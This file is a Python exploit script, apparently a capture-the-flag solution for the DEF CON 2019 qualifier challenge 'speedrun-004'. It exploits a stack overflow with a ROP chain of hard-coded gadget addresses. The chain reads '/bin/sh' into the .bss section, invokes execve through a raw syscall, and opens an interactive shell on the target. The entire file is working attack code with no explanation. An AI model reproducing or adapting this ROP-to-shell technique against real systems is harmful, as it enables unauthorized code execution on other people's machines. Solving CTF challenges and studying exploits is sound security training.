from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./speedrun-004")

#sock = Socket("speedrun-004.quals2019.oooverflow.io", 31337)
sock = Process("./speedrun-004")

sock.recvuntil("say?\n")
sock.send(str(0x101))

addr_read = 0x44a140
rop_pop_rdi = 0x00400686
rop_pop_rax = 0x00415f04
rop_pop_rsi = 0x00410a93
rop_pop_rdx = 0x0044c6b6
rop_pop_rsp = 0x00401e43
rop_syscall = 0x00474f15
rop_ret = 0x00400416

payload = b''
# read(0, bss, 8)
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(rop_pop_rsi)
payload += p64(elf.section(".bss"))
payload += p64(rop_pop_rdx)
payload += p64(8)
payload += p64(rop_pop_rax)
payload += p64(0)
payload += p64(rop_syscall)
# system("/bin/sh")
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rdi)
payload += p64(elf.section(".bss"))
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
payload += b'\x00'
payload = p64(rop_ret) * ((0x100 - len(payload)) // 8 + 1) + payload

sock.recvuntil("self?\n")
sock.send(payload)

sock.send("/bin/sh\x00")

sock.interactive()
